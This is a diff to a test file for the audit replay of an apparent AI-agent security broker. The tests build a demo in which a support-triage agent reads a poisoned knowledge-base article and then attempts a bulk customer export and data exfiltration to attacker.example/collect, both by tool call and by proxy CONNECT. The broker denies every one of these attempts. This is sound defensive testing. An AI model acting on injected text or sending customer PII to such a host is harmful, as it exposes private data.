@@ -174,9 +174,154 @@ def test_replay_with_no_matching_records_gives_a_clear_message(tmp_path, capsys)
     assert "task 4711" not in out
 
 
-def test_taint_marker_fires_exactly_once_right_after_the_causing_record():
+def test_taint_marker_appears_before_the_first_record_that_already_holds_pii():
+    # task_state is the snapshot taken BEFORE the record's own call ran (see
+    # broker/app.py: `state = taint.snapshot(...)` happens before `decide`,
+    # before `execute`, before `record_read`). So the first record whose
+    # task_state carries "pii" is the one that *followed* the read that
+    # caused it — the marker belongs directly above that record's own line,
+    # not below it.
     output = render_replay([r for r in RECORDS if r["task_id"] == "4711"])
     lines = output.splitlines()
+    doc_line = next(i for i, l in enumerate(lines) if "read_document" in l)
     query_line = next(i for i, l in enumerate(lines) if "query_customers" in l)
     taint_lines = [i for i, l in enumerate(lines) if "TAINT" in l]
-    assert taint_lines == [query_line + 1]
+    assert taint_lines == [doc_line + 1] == [query_line - 1]
+
+
+def test_describe_shows_the_document_id_for_doc_reads():
+    record = {
+        "task_id": "4711", "agent_id": "triage-bot", "purpose": "support-triage",
+        "action": {"type": "tool_call", "tool": "read_document"},
+        "target": {"kind": "doc", "path": "kb/refund-policy"},
+        "decision": "allow", "rule": "allow",
+        "task_state": {"data_classes_held": [], "rows_returned_so_far": 0}, "hash": "0" * 64,
+    }
+    assert "read_document(kb/refund-policy)" in render_replay([record])
+
+
+def test_describe_shows_the_recipient_for_mail():
+    record = {
+        "task_id": "4711", "agent_id": "triage-bot", "purpose": "support-triage",
+        "action": {"type": "tool_call", "tool": "send_email"},
+        "target": {"kind": "mail", "recipients": ["customer:8812"]},
+        "decision": "allow", "rule": "allow",
+        "task_state": {"data_classes_held": ["pii"], "rows_returned_so_far": 1}, "hash": "1" * 64,
+    }
+    assert "send_email(customer:8812)" in render_replay([record])
+
+
+# --- The real demo sequence -------------------------------------------------
+#
+# Eight records for task 4711, built through the actual AuditLog and
+# TaintTracker (not hand-rolled dicts), so every hash link and every
+# task_state snapshot is exactly what the real broker and proxy would
+# produce. Mirrors agent/cassettes/support-triage.json — the ticket read,
+# the poisoned kb article, the targeted customer lookup, the blocked bulk
+# export, the blocked direct exfil, the blocked fallback to the allowlisted
+# but pii-tainted docstore endpoint, and the final legitimate reply — plus
+# one record the cassette alone never produces: a raw CONNECT attempt at the
+# proxy, showing that layer's independent enforcement on the same task.
+
+
+def _build_demo_records(path) -> list[dict]:
+    from broker.audit import AuditLog
+    from broker.taint import TaintTracker
+
+    log = AuditLog(path)
+    taint = TaintTracker()
+    common = dict(
+        task_id="4711", agent_id="triage-bot", purpose="support-triage",
+        policy_bundle_digest="sha256:demo",
+    )
+
+    def tool_call(tool, target, decision, rule, data_class=None, rows=0):
+        state = taint.snapshot("4711")
+        log.append(
+            action={"type": "tool_call", "tool": tool}, target=target,
+            args_digest="sha256:none", decision=decision, rule=rule,
+            task_state=state, **common,
+        )
+        if decision == "allow":
+            taint.record_read("4711", data_class=data_class, rows=rows)
+
+    def connect(target, decision, rule):
+        # authorize_connect() snapshots and audits but never calls
+        # record_read: a tunnel authorization doesn't itself consume or
+        # return data, so it cannot taint the task.
+        state = taint.snapshot("4711")
+        log.append(
+            action={"type": "egress", "tool": "CONNECT"}, target=target,
+            args_digest="sha256:none", decision=decision, rule=rule,
+            task_state=state, **common,
+        )
+
+    doc_target = lambda path: {  # noqa: E731
+        "kind": "doc", "host": "", "port": 0, "path": path,
+        "estimated_rows": 0, "recipients": [],
+    }
+    db_target = lambda rows: {  # noqa: E731
+        "kind": "db", "host": "", "port": 0, "path": "",
+        "estimated_rows": rows, "recipients": [],
+    }
+    http_target = lambda host, port, path: {  # noqa: E731
+        "kind": "http", "host": host, "port": port, "path": path,
+        "estimated_rows": 0, "recipients": [],
+    }
+    mail_target = lambda recipients: {  # noqa: E731
+        "kind": "mail", "host": "", "port": 0, "path": "",
+        "estimated_rows": 0, "recipients": recipients,
+    }
+
+    tool_call("read_document", doc_target("ticket-4711"), "allow", "allow",
+              data_class="public", rows=0)
+    tool_call("read_document", doc_target("kb/refund-policy"), "allow", "allow",
+              data_class="public", rows=0)
+    tool_call("query_customers", db_target(1), "allow", "allow",
+              data_class="pii", rows=1)
+    tool_call("query_customers", db_target(10312), "deny", "rows.bounded")
+    tool_call("http_fetch", http_target("attacker.example", 80, "/collect"),
+               "deny", "egress.allowlist")
+    connect(http_target("attacker.example", 443, ""), "deny", "egress.allowlist")
+    tool_call("http_fetch", http_target("docstore.internal", 80, "/feedback"),
+               "deny", "egress.pii_sink")
+    tool_call("send_email", mail_target(["customer:8812"]), "allow", "allow",
+              data_class=None, rows=0)
+
+    return log.records()
+
+
+def test_the_full_demo_sequence_tells_the_right_story(tmp_path):
+    records = _build_demo_records(tmp_path / "demo.jsonl")
+    assert len(records) == 8
+    output = render_replay(records)
+    lines = output.splitlines()
+
+    # The taint marker sits directly under the 1-row lookup that caused it,
+    # not under the blocked bulk query that follows it.
+    causing_idx = next(i for i, l in enumerate(lines) if "rows≈1)" in l)
+    next_idx = next(i for i, l in enumerate(lines) if "rows≈10312)" in l)
+    taint_idxs = [i for i, l in enumerate(lines) if "TAINT" in l]
+    assert taint_idxs == [causing_idx + 1] == [next_idx - 1]
+
+    # Both the tool-layer and the proxy-layer exfil attempts to the same
+    # disallowed host are visible and both denied.
+    assert output.count("attacker.example") == 2
+    assert output.count("✗") >= 4
+    assert "egress.pii_sink" in output
+    assert "read_document(ticket-4711)" in output
+    assert "read_document(kb/refund-policy)" in output
+    assert "send_email(customer:8812)" in output
+    assert "chain intact: 8 records" in output
+
+
+def test_taint_marker_is_between_the_causing_record_and_the_next(tmp_path):
+    records = _build_demo_records(tmp_path / "demo.jsonl")
+    output = render_replay(records)
+    lines = output.splitlines()
+    causing_idx = next(i for i, l in enumerate(lines) if "rows≈1)" in l)
+    next_idx = next(i for i, l in enumerate(lines) if "rows≈10312)" in l)
+    taint_idxs = [i for i, l in enumerate(lines) if "TAINT" in l]
+    assert len(taint_idxs) == 1
+    assert taint_idxs[0] == causing_idx + 1
+    assert taint_idxs[0] == next_idx - 1
